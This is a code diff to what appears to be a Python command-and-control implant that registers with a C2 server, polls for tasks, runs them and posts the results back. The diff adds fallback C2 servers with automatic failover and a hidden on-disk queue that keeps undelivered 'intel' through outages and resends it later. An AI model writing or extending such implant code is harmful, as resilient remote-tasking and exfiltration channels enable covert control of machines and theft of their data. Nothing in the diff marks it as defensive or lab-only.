@@ -27,12 +27,48 @@ from urllib.request import Request, urlopen
 
 _CONFIG = {
     "c2_server": "http://127.0.0.1:4877",
+    "fallback_servers": [],
     "agent_id": "",
     "poll_interval": 5,
     "max_poll_interval": 300,
     "jitter": 0.2,
     "registration_token": "",
 }
+
+# Offline result queue: results that cannot be delivered (server down) are
+# staged on disk and flushed on the next successful round trip — a stable
+# channel keeps its intel across outages instead of dropping it.
+_QUEUE_PATH = Path(__file__).with_suffix(".queue")
+
+
+def _queue_result(result):
+    try:
+        lines = []
+        if _QUEUE_PATH.exists():
+            lines = _QUEUE_PATH.read_text().splitlines()[-199:]
+        lines.append(json.dumps(result))
+        _QUEUE_PATH.write_text("\n".join(lines))
+    except Exception:
+        pass
+
+
+def _drain_queue(server_url):
+    try:
+        if not _QUEUE_PATH.exists():
+            return
+        kept = []
+        for line in _QUEUE_PATH.read_text().splitlines()[:200]:
+            try:
+                item = json.loads(line)
+                _post_json(f"{server_url}/c2/tasks/{item['task_id']}/result", item)
+            except Exception:
+                kept.append(line)
+        if kept:
+            _QUEUE_PATH.write_text("\n".join(kept))
+        else:
+            _QUEUE_PATH.unlink()
+    except Exception:
+        pass
 
 
 def _load_config():
@@ -216,7 +252,7 @@ def _send_results(server_url, results):
         try:
             _post_json(f"{server_url}/c2/tasks/{r['task_id']}/result", r)
         except Exception:
-            pass
+            _queue_result(r)
 
 
 def _heartbeat(server_url, sys_info, results):
@@ -248,15 +284,19 @@ def _save_config():
 
 def main():
     _load_config()
-    server_url = _CONFIG["c2_server"].rstrip("/")
+    servers = [_CONFIG["c2_server"].rstrip("/")]
+    servers += [s.rstrip("/") for s in _CONFIG.get("fallback_servers", []) if s]
+    server_idx = 0
+    failures = 0
     sys_info = _collect_system_info()
 
-    resp = _heartbeat(server_url, sys_info, [])
+    resp = _heartbeat(servers[server_idx], sys_info, [])
     _save_config()
 
     backoff = _CONFIG["poll_interval"]
 
     while True:
+        server_url = servers[server_idx % len(servers)]
         # Prefer the task delivered inline with the last heartbeat (merged
         # roundtrip); fall back to a dedicated poll when none was attached.
         task = resp.get("next_task") if isinstance(resp, dict) else None
@@ -267,12 +307,18 @@ def main():
                     {"agent_id": _CONFIG["agent_id"]},
                 )
             except Exception:
+                failures += 1
+                if failures >= 3 and len(servers) > 1:
+                    server_idx += 1  # fail over to the next configured channel
+                    failures = 0
                 time.sleep(backoff)
                 backoff = min(backoff * 2, _CONFIG["max_poll_interval"])
                 continue
             task = result.get("task") if result.get("status") == "ok" else None
 
+        failures = 0
         backoff = _CONFIG["poll_interval"]
+        _drain_queue(server_url)
 
         if task:
             task_result = _execute_task(task)
